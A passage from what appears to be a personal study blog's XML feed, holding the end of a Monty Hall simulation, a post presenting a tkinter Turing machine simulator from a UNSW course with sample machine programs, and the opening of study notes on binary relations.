contestant&#39;, end=&#39; &#39;)    if not contestant_switches:        print(&#39;not &#39;, end=&#39;&#39;)    print(&#39;switching doors.\n&#39;)    nb_of_wins = 0    for i in range(nb_of_games):        doors = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;]        winning_door = choice(doors)        if i &lt; nb_of_games_to_display:            print(&#39;\tContestant does not know it, but car &#39;                  f&#39;happens to be behind door &#123;winning_door&#125;.&#39;                 )        first_chosen_door = doors.pop(randrange(3))        if i &lt; nb_of_games_to_display:            print(f&#39;\tContestant chooses door &#123;first_chosen_door&#125;.&#39;)        second_chosen_door = first_chosen_door        if first_chosen_door == winning_door:            opened_door = doors.pop(randrange(2))            if contestant_switches:                second_chosen_door = doors[0]            else:                nb_of_wins += 1        else:            doors.remove(winning_door)            opened_door = doors[0]            if contestant_switches:                second_chosen_door = winning_door                nb_of_wins += 1        if i &lt; nb_of_games_to_display:            print(f&#39;\tGame host opens door &#123;opened_door&#125;.&#39;)            print(f&#39;\tContestant chooses door &#123;second_chosen_door&#125;&#39;, end=&#39; &#39;)            print(&#39;and wins.\n&#39;) if second_chosen_door == winning_door\                                 else print(&#39;and looses.\n&#39;)        elif i == nb_of_games_to_display:            print(&#39;...\n&#39;)    print(f&#39;Contestant won &#123;nb_of_wins / nb_of_games * 100:.2f&#125;% of games.&#39;)if __name__ == &#39;__main__&#39;:    simulate()</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TuringMachine(UNSW)</title>
      <link href="/2024/10/03/Algorithm/TuringMachine/"/>
      <url>/2024/10/03/Algorithm/TuringMachine/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#introduction">introduction</a></li><li><a href="#turing-machine-simulator">turing machine simulator</a></li><li><a href="#instructions">instructions</a></li></ul><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>Alan Turing invented the Turing Machine in 1936, and this impact the history of computer. It is a very early but ultimate structure to compute something as a machine, and there is no any other better computation algorithm yet.</p><p>It has much more ancestor and complicated thoughts and instructions than assembly instructions, and most Turing study cases are in binary numbers(two based numbers), so you can imagine the ancient punched tapes are used in the early history of automatic computation. Itâ€™s implemention is not hard, but you would find it hard to conceive the basic and origin algorithms to compute addition, subtraction and so on.</p><p>Maybe you would find it difficult to read the wikipedia pages to study Turing Machine, but according my ideas, Turing Machine was built in much eairly time, thoes inventors just donnot compute too large numbers and use various application, so they could use exact tapes and came up with Turing Machine; however, we are neo-human beings, and often dont think too origin methodologies, so we directly study it may be much hard.</p><p>For learning easier, you can have a look of these videos, which may take less than one hour to have a intuitive understanding:</p><ol><li><a href="https://www.bilibili.com/video/BV1br4y1N762/">https://www.bilibili.com/video/BV1br4y1N762/</a></li><li>Neso Academy<br><a href="https://www.youtube.com/watch?v=PvLaPKPzq2I">https://www.youtube.com/watch?v=PvLaPKPzq2I</a><br><a href="https://www.youtube.com/watch?v=GPSk9tRsK2I">https://www.youtube.com/watch?v=GPSk9tRsK2I</a></li></ol><p>And now, congratulation for your memory, you have got many terms. Then just try to read, understand and debug the code below, it is not hard to read, there is only one standard GUI lib, tkinter, imported. The code was written by Eric Martin (my python lecturor in UNSW), and it is very clever and concise!</p><h1 id="turing-machine-simulator"><a href="#turing-machine-simulator" class="headerlink" title="turing machine simulator"></a>turing machine simulator</h1><p>turing_machine_simulator.py</p><pre><code class="lang-python"># Written by Eric Martin for COMP9021import tkinter as tkimport tkinter.scrolledtextimport tkinter.messageboximport tkinter.simpledialogclass TuringMachineSimulator(tk.Tk):    max_nb_of_steps = 1000    def __init__(self):        super().__init__()        self.title(&#39;Turing Machine Simulator&#39;)        menubar = tk.Menu()        help_menu = tk.Menu(menubar)        menubar.add_cascade(label=&#39;Turing Machine Simulator Help&#39;,                            menu=help_menu                          )        help_menu.add_command(label=&#39;Tape&#39;, command=self.tape_help)        help_menu.add_command(label=&#39;Program&#39;, command=self.program_help)        help_menu.add_command(label=&#39;Execution&#39;, command=self.execution_help)        self.config(menu=menubar)        self.scrollable_tape = ScrollableTape()        self.scrollable_tape.pack()        self.program = Program()        dashboard = tk.Frame()        self.state = State(dashboard)        self.state.pack(padx=20, side=tk.LEFT)        self.iteration = Iteration(dashboard)        self.iteration.pack(padx=20, side=tk.LEFT)        self.status = Status(dashboard, self.program)        self.status.pack(padx=20)        dashboard.pack()        buttons = tk.Frame(bd=20)        self.next_phase = &#39;Start&#39;        self.next_phase_button = tk.Button(buttons, text=&#39;Start&#39;, width=5,                                          command=self.change_interface                                          )        self.next_phase_button.pack(padx=30, side=tk.LEFT)        self.step_button = tk.Button(buttons, text=&#39;Step&#39;, command=self.step,                                    state=tk.DISABLED                                    )        self.step_button.pack(padx=30, side=tk.LEFT)        self.continue_button = tk.Button(buttons, text=&#39;Continue&#39;,                                        command=self.run_further,                                        state=tk.DISABLED                                        )        self.continue_button.pack(padx=30)        buttons.pack()        self.program.pack()    def tape_help(self):        tkinter.messagebox.showinfo(                &#39;Tape&#39;,                &#39;The tape always contains an &quot;origin&quot; cell.\n\nControl &#39;                &#39;clicking to the right or to the left of the current &#39;                &#39;rightmost or leftmost cell, respectively, adds a new &#39;                &#39;cell.\n\n Control clicking on the current rightmost &#39;                &#39;or leftmost added cell removes it.\n\nClicking on any &#39;                &#39;cell flips the bit it contains from 1 to 0 or from 0 &#39;                &#39;to 1.&#39;                                    )    def program_help(self):        tkinter.messagebox.showinfo(                &#39;Program&#39;,                &#39;A program is a set of instructions of the form\n&#39;                &#39;    (state_1, bit_1, state_2, bit_2, dir)\n&#39;                &#39;where state_1 and state_2 have to be alphanumeric &#39;                &#39;words with at most 8 characters, bit_1 and bit_2 have &#39;                &#39;to be 0 or 1, and dir has to be L or R.\n\nWhen the &#39;                &#39;TM machine is in state state_1 with its head pointing &#39;                &#39;to a cell containing bit_1, then it changes bit_1 to &#39;                &#39;bit_2 in that cell, modifies its state to state_2, &#39;                &#39;and moves its head one cell to the right or to the &#39;                &#39;left as determined by dir.\n\nThe TM machine is &#39;                &#39;supposed to be deterministic, hence the program &#39;                &#39;should not contain two instructions starting with &#39;                &#39;the same pair (state_1, bit_1).\n\nThe program can &#39;                &#39;contain comments, namely, lines starting with #.&#39;                                    )    def execution_help(self):        tkinter.messagebox.showinfo(                &#39;Execution&#39;,                &#39;When the leftmost button displays Start, the status &#39;                &#39;indicator is red, the tape can be modified, the &#39;                &#39;program can be edited, the Step and Continue buttons &#39;                &#39;are disabled, and no State or Iteration is &#39;                &#39;displayed.\n\n Once this button has been pressed, it &#39;                &#39;displays Stop, the status indicator is green, the &#39;                &#39;tape cannot be modified, the program cannot be &#39;                &#39;edited, and the current State and Iteration are &#39;                &#39;displayed.\n\nWhen execution stops, either because no &#39;                &#39;instruction can be executed or because Stop has been &#39;                &#39;pressed, the Step and Continue buttons are disabled &#39;                &#39;and the leftmost button displays Clear; it has to be &#39;                &#39;pressed to restore the tape to its initial &#39;                &#39;configuration, with only the &quot;origin&quot; cell &#39;                &#39;containing 1.\n\nPressing the Start button prompts &#39;                &#39;the user for an initial state, which has to be an &#39;                &#39;alphanumeric word with at most 8 characters, and &#39;                &#39;commences execution provided at least one cell &#39;                &#39;contains 1, in which case the head initially points &#39;                &#39;to the leftmost cell containing 1.\n\nThe Step button &#39;                &#39;executes one instruction, if possible; otherwise &#39;                &#39;execution stops.\n\nThe Continue buttom executes up &#39;                &#39;to 1,000 instructions, if possible; otherwise &#39;                &#39;execution stops.\n\nThe Stop button allows one to &#39;                &#39;start a new excution in case it is either not &#39;                &#39;desirable or not possible to terminate execution with &#39;                &#39;a sequence of clicks on the Step or Continue buttons.&#39;                                    )    def change_interface(self):        &#123;&#39;Start&#39;: self.start, &#39;Stop&#39;: self.stop, &#39;Clear&#39;: self.clear        &#125;[self.next_phase]()    def start(self):        if not self.program.read_instructions():            return        initial_state = tkinter.simpledialog.askstring(&#39;Starting program&#39;,                                                      &#39;Enter initial state: &#39;                                                      )        if initial_state is None:            return        if not StateName(initial_state).check_syntactic_validity():            return        # Look for leftmost 1        for i in range(len(self.scrollable_tape.cells[0]) - 1, -1, -1):            if self.scrollable_tape.bits[0][i] == 1:                self.scrollable_tape.tape.itemconfig(                        self.scrollable_tape.cells[0][i], fill=&#39;red&#39;,                        font=(&#39;normal&#39;, 20, &#39;bold&#39;)                                                    )                self.current_index = -i                break        else:            for i in range(1, len(self.scrollable_tape.cells[1])):                if self.scrollable_tape.bits[1][i] == 1:                    self.scrollable_tape.tape.itemconfig(                            self.scrollable_tape.cells[1][i],                            fill=&#39;red&#39;, font=(&#39;normal&#39;, 20, &#39;bold&#39;)                                                        )                    self.current_index = i                    break            else:                tkinter.messagebox.showerror(                        &#39;Tape error&#39;,                        &#39;Cannot run, no bit is set to 1 in tape&#39;                                            )                return        self.status.running_program(True)        self.update_phase(&#39;Stop&#39;)        self.current_bit = 1        self.current_state = initial_state        self.current_iteration = 0        self.iteration.update(0)        self.state.update(initial_state)    def clear(self):        self.scrollable_tape.clear()        self.update_phase(&#39;Start&#39;)    def step(self):        state, bit = self.current_state, self.current_bit        if (state, bit) not in self.program.instructions:            self.status.running_program(False)            self.update_phase(&#39;Clear&#39;)            return        new_state, new_bit, direction = self.program.instructions[state, bit]        self.state.update(new_state)        self.current_iteration += 1        self.iteration.update(self.current_iteration)        i = self.current_index        side = i &gt; 0        j = abs(i)        self.scrollable_tape.bits[side][j] = new_bit        if i == 0:            self.scrollable_tape.bits[not side][0] = new_bit        self.scrollable_tape.tape.itemconfig(                self.scrollable_tape.cells[side][j], text=new_bit,                fill=&#39;black&#39;, font=(&#39;normal&#39;, 16, &#39;normal&#39;)                                            )        i += direction        side = i &gt; 0        j = abs(i)        if j &gt;= len(self.scrollable_tape.bits[side]):            self.scrollable_tape.add_cell_to_end(side)        self.scrollable_tape.tape.itemconfig(                self.scrollable_tape.cells[side][j],                fill=&#39;red&#39;, font=(&#39;normal&#39;, 20, &#39;bold&#39;)                                            )        self.current_bit = self.scrollable_tape.bits[side][j]        self.current_index = i        self.current_state = new_state    def run_further(self):        if self.next_phase == &#39;Stop&#39;:            bound = self.current_iteration + self.max_nb_of_steps        while self.next_phase == &#39;Stop&#39; and self.current_iteration &lt; bound:            self.step()    def stop(self):        self.status.running_program(False)        self.update_phase(&#39;Clear&#39;)    def update_phase(self, phase):        self.next_phase = phase        self.next_phase_button.config(text=phase)        if phase == &#39;Start&#39;:            self.state.update(&#39;&#39;)            self.iteration.update(&#39;&#39;)        elif phase == &#39;Stop&#39;:            self.step_button.config(state=tk.NORMAL)            self.continue_button.config(state=tk.NORMAL)        else:            self.step_button.config(state=tk.DISABLED)            self.continue_button.config(state=tk.DISABLED)class ScrollableTape(tk.Frame):    tape_colour = &#39;#FFFAF0&#39;    cell_colour = &#39;#8B7765&#39;    cell_size = 30    nb_of_cells_without_scroll = 21    cell_proportion_for_endspace = 2.2    def __init__(self):        super().__init__(bd=10, padx=20)        self.set_original_conditions()        w = (self.nb_of_cells_without_scroll            + 2 * self.cell_proportion_for_endspace            ) * self.cell_size        self.tape = tk.Canvas(self, width=w, height=self.cell_size + 1,                              bg=self.tape_colour                            )        self.draw_minimal_tape()        self.tape.grid(row=0)        scrollbar = tk.Scrollbar(self, orient=tk.HORIZONTAL,                                command=self.tape.xview                                )        self.tape.config(xscrollcommand=scrollbar.set)        scrollbar.grid(row=1, sticky=tk.EW)        self.tape.bind(&#39;&lt;1&gt;&#39;, self.flip_bit)        self.tape.bind(&#39;&lt;Control-1&gt;&#39;, self.add_or_remove_cell)    # To start with, only one cell is displayed. More cells can be    # displayed to the right (expanding the list self.cells[1]) or to    # the left (expanding the list self.cells[0]), the lists    # self.cells[1] and self.cells[0] being handles to the textual    # display of the bits they store, which are recorded in self.bits[1]    # and self.bits[0], respectively.    # self.max_indexes[1] and self.max_indexes[0] record  the number of    # these extra cells, respectively.    # We use i to refer to the ith-cell on the right, and -i to refer to    # the ith-cell on the left.    def set_original_conditions(self):        self.max_indexes = [0, 0]        self.bits = [1], [1]        self.cells = [None], [None]        self.lines = [None], [None]    def determine_left_boundary(self):        return -(self.max_indexes[0] + self.cell_proportion_for_endspace)\              * self.cell_size    def determine_right_boundary(self):        return self.cell_size * (max(self.nb_of_cells_without_scroll,                                    self.max_indexes[1]                                    ) + self.cell_proportion_for_endspace                                )    def draw_minimal_tape(self):        left_boundary = self.determine_left_boundary()        right_boundary = self.determine_right_boundary()        self.tape.config(scrollregion=(left_boundary, -(self.cell_size / 2),                                      right_boundary, self.cell_size + 1                                      )                        )        self.tape.delete(tk.ALL)        self.tape.create_line(-0.5 * self.cell_size, 0, -0.5 * self.cell_size,                              self.cell_size, width=2, fill=self.cell_colour                            )        self.cells[0][0] = self.tape.create_text(0, self.cell_size / 2,                                                text=self.bits[0][0],                                                font=(&#39;normal&#39;, 16)                                                )        self.tape.create_line(0.5 * self.cell_size, 0, 0.5 * self.cell_size,                              self.cell_size, width=2, fill=self.cell_colour                            )        self.draw_horizontal_lines(left_boundary, right_boundary)    def draw_horizontal_lines(self, left_boundary, right_boundary):        self.tape.create_line(left_boundary, 0, right_boundary - left_boundary,                              0, width=3, fill=self.cell_colour                            )        self.tape.create_line(left_boundary, self.cell_size, right_boundary,                              self.cell_size, width=3, fill=self.cell_colour                            )    def add_cell_to_end(self, side):        i = len(self.bits[side])        if i &gt; self.max_indexes[side]:            self.max_indexes[side] = i            left_boundary = self.determine_left_boundary()            right_boundary = self.determine_right_boundary()            self.tape.config(scrollregion=(left_boundary,                                          -(self.cell_size / 2),                                          right_boundary, self.cell_size + 1                                          )                            )            self.draw_horizontal_lines(left_boundary, right_boundary)        self.bits[side].append(0)        self.cells[side].append(None)        self.lines[side].append(None)        s = side * 2 - 1        self.cells[side][i] = self.tape.create_text(i * s * self.cell_size,                                                    self.cell_size / 2, text=0,                                                    font=(&#39;normal&#39;, 16)                                                  )        self.lines[side][i] = self.tape.create_line(                                      s * (i + 0.5) * self.cell_size, 0,                                      s * (i + 0.5) * self.cell_size,                                      self.cell_size, width=2,                                      fill=self.cell_colour                                                  )    def flip_bit(self, event):        if not self.master.next_phase == &#39;Start&#39;:            return        if 0 &lt;= event.y &lt;= self.cell_size:            i = round(self.tape.canvasx(event.x) / self.cell_size)            side = i &gt; 0            i = abs(i)            if 0 &lt;= i &lt; len(self.cells[side]):                self.bits[side][i] = not self.bits[side][i]                self.tape.itemconfig(self.cells[side][i],                                    text=self.bits[side][i],                                    font=(&#39;normal&#39;, 16)                                    )    def add_or_remove_cell(self, event):        if not self.master.next_phase == &#39;Start&#39;:            return        if 0 &lt;= event.y &lt;= self.cell_size:            i = round(event.widget.canvasx(event.x) / self.cell_size)            if i == 0:                return            side = i &gt; 0            i = abs(i)            if i == len(self.bits[side]) - 1:                self.tape.delete(self.cells[side][i])                self.tape.delete(self.lines[side][i])                del self.bits[side][i]                del self.cells[side][i]                del self.lines[side][i]            elif i == len(self.bits[side]):                self.add_cell_to_end(side)    def clear(self):        del self.cells[0][1 :]        del self.cells[1][1 :]        del self.bits[0][1 :]        del self.bits[1][1 :]        del self.lines[0][1 :]        del self.lines[1][1 :]        self.set_original_conditions()        self.max_indexes = [0, 0]        self.draw_minimal_tape()class Program(tk.Frame):    label_colour = &#39;#0B0974&#39;    program_box_colour = &#39;#F0FFF0&#39;    program_selected_box_colour = &#39;#E0EEE0&#39;    def __init__(self):        super().__init__(bd=30)        tk.Label(self, text=&#39;Program&#39;, fg=self.label_colour, bd=10).pack()        self.source_code = tkinter.scrolledtext.ScrolledText(                                  self, width=30, height=25,                                  font=(&#39;nomal&#39;, 20),                                  highlightbackground=self.program_box_colour,                                  highlightcolor=                                          self.program_selected_box_colour                                                            )        self.source_code.pack()    def read_instructions(self):        self.instructions = &#123;&#125;        source_instructions = self.source_code.get(0.0, tk.END)        for instruction in source_instructions.splitlines():            quintuple = instruction.split()            if len(quintuple) == 0 or quintuple[0][0] == &#39;#&#39;:                continue            if len(quintuple) != 5:                tkinter.messagebox.showerror(                        &#39;Instruction error&#39;,                        f&#39;&#123;instruction&#125; is not a quintuple&#39;                                            )                return False            state, bit, new_state, new_bit, direction = quintuple            if not StateName(state).check_syntactic_validity():                return False            if not Bit(bit).check_syntactic_validity():                return False            if not StateName(new_state).check_syntactic_validity():                return False            if not Bit(new_bit).check_syntactic_validity():                return False            if direction != &#39;L&#39; and direction != &#39;R&#39;:                tkinter.messagebox.showerror(&#39;Instruction error&#39;,                                            f&#39;&#123;direction&#125; should be L or R&#39;                                            )                return False            if (state, int(bit)) in self.instructions:                tkinter.messagebox.showerror(                        &#39;Instruction error&#39;,                        f&#39;More than one instruction for pair (&#123;state&#125;, &#123;bit&#125;)&#39;                                            )                return False            self.instructions[state, int(bit)] =\                    new_state, int(new_bit), (direction == &#39;R&#39;) * 2 - 1        return Trueclass StateName(str):    def check_syntactic_validity(self):        if self is None:            tkinter.messagebox.showerror(&#39;State name error&#39;,                                        &#39;State name cannot be None&#39;                                        )            return False        if len(self) &gt; 8:            tkinter.messagebox.showerror(                    &#39;State name error&#39;,                    f&#39;&#123;self&#125; contains more than 8 characters&#39;                                        )            return False        if not self.isalnum():            tkinter.messagebox.showerror(&#39;State name error&#39;,                                        f&#39;&#123;self&#125; not all nonalphanumeric&#39;                                        )            return False        return Trueclass Bit(str):    def check_syntactic_validity(self):        if self not in &#39;01&#39;:            tkinter.messagebox.showerror(&#39;Instruction error&#39;,                                        f&#39;&#123;self&#125; should be 0 or 1&#39;                                        )            return False        return Trueclass State(tk.Frame):    def __init__(self, master):        super().__init__(master)        tk.Label(self, text=&#39;State: &#39;, fg=Program.label_colour                ).pack(side=tk.LEFT)        self.state = tk.StringVar()        tk.Label(self, width=8, textvariable=self.state).pack()    def update(self, s):        self.state.set(s)class Iteration(tk.Frame):    def __init__(self, master):        super().__init__(master)        tk.Label(self, text=&#39;  Iteration: &#39;, fg=Program.label_colour                ).pack(side=tk.LEFT)        self.iteration = tk.StringVar()        tk.Label(self, width=4, height=1, textvariable=self.iteration).pack()    def update(self, i):        self.iteration.set(i)class Status(tk.Canvas):    not_running_fill_colour = &#39;#FF1E00&#39;    not_running_outline_colour = &#39;#980023&#39;    running_fill_colour = &#39;#25D500&#39;    running_outline_colour = &#39;#007439&#39;    def __init__(self, master, program):        super().__init__(master, width=20, height=20)        self.status = self.create_oval(10, 10, 20, 20,                                      fill=self.not_running_fill_colour,                                      outline=self.not_running_outline_colour                                      )        self.pack()        self.program = program    def running_program(self, running):        if running:            self.itemconfig(self.status, fill=self.running_fill_colour,                            outline=self.running_outline_colour                          )            self.program.source_code.config(state=&#39;disabled&#39;)        else:            self.itemconfig(self.status, fill=self.not_running_fill_colour,                            outline=self.not_running_outline_colour                          )            self.program.source_code.config(state=&#39;normal&#39;)if __name__ == &#39;__main__&#39;:    TuringMachineSimulator().mainloop()</code></pre><h1 id="instructions"><a href="#instructions" class="headerlink" title="instructions"></a>instructions</h1><p>addition.txt</p><pre><code># Initial state: q0q0 1 q1 0 Rq1 1 q1 1 Rq1 0 q2 1 Lq2 1 q2 1 Lq2 0 q3 0 R</code></pre><p>division_by_2.txt</p><pre><code># Initial state: del1del1 1 del2 0 Rdel2 1 mov1R 0 Rmov1R 1 mov1R 1 Rmov1R 0 mov2R 0 Rmov2R 1 mov2R 1 Rmov2R 0 mov1L 1 Lmov1L 1 mov1L 1 Lmov1L 0 mov2L 0 Lmov2L 1 mov2L 1 Lmov2L 0 del1 0 Rdel1 0 end 0 Rdel2 0 end 0 R</code></pre><p>multiplication.txt</p><pre><code># Initial state: q0q0 0 q1 0 Rq0 1 q1 0 Rq1 0 q15 0 Rq1 1 q2 1 Rq2 0 q3 0 Rq2 1  q2 1 Rq3 0 q3 0 Rq3 1 q4 0 Rq4 0 q13 1 Lq4 1 q7 1 Rq7 0 q8 0 Rq7 1 q7 1 Rq8 0 q10 1 Lq8 1 q9 1 Rq9 0 q10 1 Lq9 1 q9 1 Rq10 0 q11 0 Lq10 1 q10 1 Lq11 0 q3 0 Rq11 1 q11 1 Lq13 0 q13 0 Lq13 1 q14 1 Lq14 0 q0 0 Rq14 1 q14 1 Lq15 0 q15 1 Rq15 1 q17 1 Lq17 1 q17 1 Lq17 0 q18 0 R</code></pre><p>parity</p><pre><code># Initial state: eveneven 1 odd 0 Rodd 1 even 0 Rodd 0 end 1 Lend 0 end 0 R</code></pre><p>successor.txt</p><pre><code># Initial state: q0q0 1 q0 1 Lq0 0 q1 1 Lq1 0 q1 0 R</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>relation(1)</title>
      <link href="/2024/10/03/Math/relation/"/>
      <url>/2024/10/03/Math/relation/</url>
      
        <content type="html"><![CDATA[<p>Recently I struggle with math, Paul taught 3 lectures in 26th and 27th September, with plenty of concepts and notions. I didnot got much during the lessons, there was a big mass among those wonderful concepts in my brain. It has been nearly 2 weeks after that, I spent 4 days watching the recordings and sorted out those concepts with my annotations about my confusions during the first learning.</p><p>It is a little different from algebra and geomatry. I suggest to know the definitions, and then just try to infer or understand those inferences.</p><ul><li><a href="#relation-definition-and-examples">Relation Definition and Examples</a><ul><li><a href="#example-these-are-relations">Example: These are relations</a></li><li><a href="#example-a-binary-relation">Example: a binary relation</a></li><li><a href="#example-3-ary-relation">Example: 3-ary relation</a></li></ul></li><li><a href="#binary-relations">Binary Relations</a><ul><li><a href="#special-trivial-relations">Special (Trivial) Relations</a></li><li><a href="#defining-binary-relations-set-based-definitions">Defining binary relations: Set-based definitions</a><ul><li><a href="#matrix-representation">Matrix representation</a></li><li><a href="#graphical-representation">graphical representation</a></li></ul></li><li><a href="#operations-for-binary-relations-converse-and-composition">Operations for binary relations: Converse and Composition</a></li><li><a href="#relational-image-definition">Relational image definition</a></li><li><a href="#relational-image-exercise">Relational image exercise</a></li></ul></li><li><a href="#properties-of-binary-relations">Properties of Binary Relations</a><ul><li><a href="#definition-of-five-properties-of-binary-relations-fun-tot-inj-sur-bij-of-r-subseteq-s-times-t">Definition of five properties of Binary Relations (Fun) (Tot) (Inj) (Sur) (Bij) of $R \subseteq S \times T$</a></li><li><a href="#functions-and-function-properties">Functions and function properties</a></li><li><a href="#properties-of-binary-relations-r-subseteq-s-times-srarsast">Properties of Binary Relations $R \subseteq S \times S$:(R)(AR)(S)(AS)(T)</a><ul><li><a href="#definition">Definition</a></li><li><a href="#examples-by-graph">examples by graph</a></li><li><a href="#exercise">exercise</a></li></ul></li></ul></li><li><a href="#functions">Functions</a><ul><li><a href="#converse-of-a-function">Converse of a function</a></li><li><a href="#properties-of-bijections">Properties of bijections</a></li></ul></li></ul><h1 id="Relation-Definition-and-Examples"><a href="#Relation-Definition-and-Examples" class="headerlink" title="Relation Definition and Examples"></a>Relation Definition and Examples</h1><p>An <strong>n-ary relation</strong> is a <strong>subset</strong> of the <strong>Cartesian product of n sets</strong>.</p><script type="math/tex; mode=display">R \subseteq S_1 \times S_2 \times \dots \times S_n</script><p>To show tuples related by R we write:</p><p>$(x_1,x_2,\dots,x_n)\in R$ or $R(x_1,x_2,\dots,x_n)$</p><p>If n = 2 we have a binary relation R âŠ† SÃ—T and to show pairs related by R we write:</p><script type="math/tex; mode=display">(x,y) \in R \quad \text{or} \quad R(x,y) \quad \text{or} \quad xRy</script><hr><script type="math/tex; mode=display">U = S_1 \times S_2 \times \dots \times S_n</script><p>is the <strong>domain</strong> of R, and we say <strong>R is a relation on U</strong> (or on <strong>S</strong> if $S_1= \dots =S_n=S$ and n is clear).</p><p>Remeber these definition, later we may use â€˜&lt;â€™, â€˜&gt;â€™ or â€˜=â€™ to replace â€˜Râ€™ (namely relation) literally as an expression.</p><h2 id="Example-These-are-relations"><a href="#Example-These-are-relations" class="headerlink" title="Example: These are relations"></a>Example: These are relations</h2><p>Equality: $=$</p><p>Inequality: $â‰¤, â‰¥, &lt;, &gt;, \neq$</p><p>Divides relation: $|$</p><p>Element of: $âˆˆ$</p><p>Subset, superset: $âŠ†, âŠ‚, âŠ‡, âŠƒ$</p><p>Congruence modulo n: $m\underset{(n)}{=}p$</p><h2 id="Example-a-binary-relation"><a href="#Example-a-binary-relation" class="headerlink" title="Example: a binary relation"></a>Example: a binary relation</h2><p>S =set of CSE students (S can be a subset of the set of all students)</p><p>C =set of CSE courses (likewise)</p><p>E =enrolments = { (s,c):s takes c }</p><p>hence</p><script type="math/tex; mode=display">E \subseteq S \times C</script><p>In practice, almost always there are various â€˜ontoâ€™ (nonemptiness) and (uniqueness) constraints on database relations.</p><p>Note, here mentioned nonemptiness and uniqueness, if you operated a database, such as mysql, you would easily understand why to set part of columns unique or nonempty.</p><p><strong>Uniqueness</strong> means that there must be one column with unique values in database; <strong>Nonemptiness</strong> means that in $S_1 \times S_2 \times S_3$, there are must 3 elements in the three sets.</p><h2 id="Example-3-ary-relation"><a href="#Example-3-ary-relation" class="headerlink" title="Example: 3-ary relation"></a>Example: 3-ary relation</h2><p>Example (Class schedule)</p><p>C = CSE courses</p><p>T = starting time (hour &amp; day)</p><p>R = lecture rooms</p><p>$\therefore$ S = schedule = { (c,t,r) : c is at t in r } âŠ† CÃ—TÃ—R</p><h1 id="Binary-Relations"><a href="#Binary-Relations" class="headerlink" title="Binary Relations"></a>Binary Relations</h1><p>A binary relation between S and T is a subset of SÃ—T: i.e. a <strong>set</strong> of <strong>ordered pairs</strong>.</p><p>Also: over S and T; from S to T; <strong>on S (if S = T)</strong>.</p><p>Note <strong>on S</strong>, it means the relation is on S itself, namely $S \times S$.</p><h2 id="Special-Trivial-Relations"><a href="#Special-Trivial-Relations" class="headerlink" title="Special (Trivial) Relations"></a>Special (Trivial) Relations</h2><p>Identity: (diagonal, equality) I = {(x,x):x âˆˆ S }</p><p>Empty: âˆ…</p><p>Universal: U = SÃ—S</p><h2 id="Defining-binary-relations-Set-based-definitions"><a href="#Defining-binary-relations-Set-based-definitions" class="headerlink" title="Defining binary relations: Set-based definitions"></a>Defining binary relations: Set-based definitions</h2><p>Defining a relation RâŠ†SÃ—T:</p><ol><li><p>Explicitly listing tuples: e.g. {(1,1),(2,3),(3,2)}</p></li><li><p>Set comprehension: {(x,y) âˆˆ [1,3] Ã— [1,3] : 5|xy âˆ’ 1}</p></li><li><p>Construction from other relations: {(1, 1)} âˆª {(2,3)} âˆª {(2,3)}â† (note that â†)</p></li></ol><h3 id="Matrix-representation"><a href="#Matrix-representation" class="headerlink" title="Matrix representation"></a>Matrix representation</h3><p><img src="/2024/10/03/Math/relation/2024-10-06-08-54-28.png" alt></p><h3 id="graphical-representation"><a href="#graphical-representation" class="headerlink" title="graphical representation"></a>graphical representation</h3><p><img src="/2024/10/03/Math/relation/2024-10-06-08-55-29.png" alt></p><p>Or as a directed graph, R = SÃ—S , Nodes are emelents(domain, namely S), edges are elements of R(relation)</p><p><img src="/2024/10/03/Math/relation/2024-10-06-08-56-00.png" alt></p><h2 id="Operations-for-binary-relations-Converse-and-Composition"><a href="#Operations-for-binary-relations-Converse-and-Composition" class="headerlink" title="Operations for binary relations: Converse and Composition"></a>Operations for binary relations: Converse and Composition</h2><p>Relations are sets, so the standard set operations (âˆ©, âˆª, , âŠ•, etc) can be used to build new relations.</p><p>Two operations that apply to binary relations uniquely:</p><p>Converse: If RâŠ†SÃ—T is a relation, then $R ^ \leftarrow \subseteq T \times S$:</p><script type="math/tex; mode=display">R^\leftarrow \overset{def}{=} \{ (t,s) \in T \times S: (s,t) \in R \}</script><p>Composition: If R1âŠ†SÃ—T and R2âŠ†TÃ—U then R1;R2 âŠ† SÃ—U:</p><script type="math/tex; mode=display">R1;R2 \overset{def}{=} \{(s,u) \in S \times U: \quad \text{there exists tâˆˆT such that (s,t)âˆˆR1 and (t,u)âˆˆR2} \}</script><p>Fact:</p><script type="math/tex; mode=display">(R^\leftarrow)^\leftarrow = R</script><p>Graphical representation</p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-06-36.png" alt></p><h2 id="Relational-image-definition"><a href="#Relational-image-definition" class="headerlink" title="Relational image definition"></a>Relational image definition</h2><p>Given R âŠ† S Ã—T, AâŠ†S, and B âŠ†T.</p><p><strong>Relational image of A</strong>, R(A):</p><script type="math/tex; mode=display">R(A) \overset{def}{=} \{t \in T: (s,t) \in R \quad \text{ for some } s \in A\}</script><p>Relational pre-image of B, Râ†(B):</p><script type="math/tex; mode=display">R^\leftarrow (B) \overset{def}{=} \{s \in S: (s,t) \in R \quad \text{ for some t} \in B\}</script><p><strong>Personal understanding</strong>, RâŠ†SÃ—T, <strong>image</strong> is <strong>a subset of S</strong>, pre-image is similar to converse relation, and its domain is <strong>subset of T</strong>. And the <strong>answer set is a set containing elements, rather not the pairs</strong>. The domain and co-domain are changed by <strong>$R(xxx)$</strong> or $R^\leftarrow (xxx)$</p><p>Pay attention to the math expression writing, it is not R, itâ€™s R(xx). What we learned in high school, the functions with its input range and output range, is exactly the images of functions.</p><p>Observe that the relational pre-image is the relational image of the converse relation.</p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-10-57.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-11-21.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-11-38.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-11-59.png" alt></p><h2 id="Relational-image-exercise"><a href="#Relational-image-exercise" class="headerlink" title="Relational image exercise"></a>Relational image exercise</h2><p><img src="/2024/10/03/Math/relation/2024-10-06-09-21-58.png" alt></p><p>note: <code>|</code> is division, such as, 2 divides 4 and 6.</p><p>$\subseteq^\leftarrow : \quad\subseteq$ means subset, so $\subseteq^\leftarrow$ means 